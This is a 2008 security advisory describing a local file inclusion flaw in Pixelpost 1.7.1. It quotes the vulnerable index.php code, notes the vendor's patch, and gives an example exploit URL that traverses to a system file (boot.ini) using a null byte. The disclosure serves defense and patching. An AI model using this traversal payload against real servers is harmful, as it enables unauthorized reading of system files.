PixelPost 1.7.1 (language_full) Local File Inclusion Vulnerability
==================================================================


Digital Security Research Group [DSecRG] Advisory       #DSECRG-08-033


Application:                    Pixelpost photoblog
Versions Affected:              1.7.1
Vendor URL:                     http://www.pixelpost.org/
Bug:                            Local File Include
Exploits:                       YES
Reported:                       22.07.2008
Vendor response:                23.07.2008
Solution:                       YES
Date of Public Advisory:        28.07.2008
Authors:                        Digital Security Research Group [DSecRG] 



Description
***********

Pixelpost photoblog has local file include vulnerability in script index.php

Successful exploitation requires that "register_globals" is enabled.

Code
****
#################################################

$PP_supp_lang = array(&#039;dutch&#039;=>array(&#039;NL&#039;,&#039;Nederlands&#039;),
                                          &#039;english&#039;=>array(&#039;EN&#039;,&#039;English&#039;),
                                          &#039;french&#039;=>array(&#039;FR&#039;,&#039;Francais&#039;),
                                          &#039;german&#039;=>array(&#039;DE&#039;,&#039;Deutsch&#039;),
                                          &#039;italian&#039;=>array(&#039;IT&#039;,&#039;Italiano&#039;),
                                          &#039;norwegian&#039;=>array(&#039;NO&#039;,&#039;Norsk&#039;),
                                          &#039;persian&#039;=>array(&#039;FA&#039;,&#039;Farsi&#039;),
                                          &#039;polish&#039;=>array(&#039;PL&#039;,&#039;Polskiego&#039;),
                                          &#039;portuguese&#039;=>array(&#039;PT&#039;,&#039;Portugues&#039;),
                                          &#039;simplified_chinese&#039;=>array(&#039;CN&#039;,&#039;Chinese&#039;),
                                          &#039;spanish&#039;=>array(&#039;ES&#039;,&#039;Espanol&#039;),
                                          &#039;swedish&#039;=>array(&#039;SE&#039;,&#039;Svenska&#039;),
                                          &#039;danish&#039;=>array(&#039;DK&#039;,&#039;Dansk&#039;),
                                          &#039;japanese&#039;=>array(&#039;JP&#039;,&#039;Japanese&#039;),
                                          &#039;hungarian&#039;=>array(&#039;HU&#039;,&#039;Magyar&#039;),
                                          &#039;romanian&#039;=>array(&#039;RO&#039;,&#039;Romana&#039;),
                                          &#039;russian&#039;=>array(&#039;RU&#039;,&#039;Russian&#039;),
                                          &#039;czech&#039;=>array(&#039;CS&#039;,&#039;Cesky&#039;)
                                         );
...
if(isset($_GET[&#039;lang&#039;])) { $language_abr = substr($_GET[&#039;lang&#039;],0,2); }

foreach ($PP_supp_lang as $key => $row) {
        foreach($row as $cell){
                if ($cell == strtoupper($language_abr)) { $language_full = $key; }
        }
}
...
if(!empty($language_full)) {
        if(file_exists("language/lang-".$language_full.".php")) {

                if( !isset($_GET[&#039;x&#039;])OR($_GET[&#039;x&#039;] != "rss" & $_GET[&#039;x&#039;] != "atom")) {
                        require("language/lang-".$language_full.".php");
                }
        }else{
        ...

#################################################

Example:

http://[server]/[installdir]/index.php?lang=DSecRG&language_full=../../../../../../../../../../../../../boot.ini%00



Solution
********

Vendor fix this flaw on 27.07.2008. Security Patch can be downloaded here:

http://www.pixelpost.org/blog/2008/07/27/pixelpost-171-security-patch/



About
*****

Digital Security is leading IT security company in Russia, providing information security consulting, audit and penetration testing services, risk analysis and ISMS-related services and certification for ISO/IEC 27001:2005 and PCI DSS standards. Digital Security Research Group focuses on web application and database security problems with vulnerability reports, advisories and whitepapers posted regularly on our website.




